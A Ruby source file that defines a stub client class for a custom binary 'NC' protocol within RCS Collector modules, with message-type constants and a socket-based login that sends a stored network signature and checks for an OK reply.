#
#  The NC protocol implementation
#

# relatives
require_relative 'db.rb'

# from RCS::Common
require 'rcs-common/trace'

# system

module RCS
module Collector

class NCProto
  include RCS::Tracer
  
  PROTO_OK		  = 0x000F0001  # OK
  PROTO_NO		  = 0x000F0002  # Error
  PROTO_BYE		  = 0x000F0003  # Close the session
  PROTO_LOGIN		= 0x000F0004  # Authentication to the component
  PROTO_MONITOR	= 0x000F0005  # Status of the component
  PROTO_CONF		= 0x000F0006  # New configuration
  PROTO_LOG		  = 0x000F0007	# Logs from the component
  PROTO_VERSION	= 0x000F0008	# Version information

  def initialize(element, socket)
    @element = element
    @socket = socket
  end

  def get_command

  end

  def login

    # login command payload
    command = DB.instance.network_signature

    # the common header
    header = [PROTO_LOGIN].pack('i')
    header += [command.length].pack('i')

    # the whole message
    message = header + command

    # send and receive
    @socket.syswrite message
    response = @socket.sysread(header.length)

    # check if everything is ok
    return true if response.unpack('i') == [PROTO_OK]

    return false
  end

  def version
    trace :debug, "VERSION"
  end

  def monitor
    trace :debug, "MONITOR"
  end

  def config
    trace :debug, "CONFIG"
  end

  def log
    trace :debug, "LOG"
  end

  def bye
    trace :debug, "BYE"
  end
  
end #NCProto

end #Collector::
end #RCS::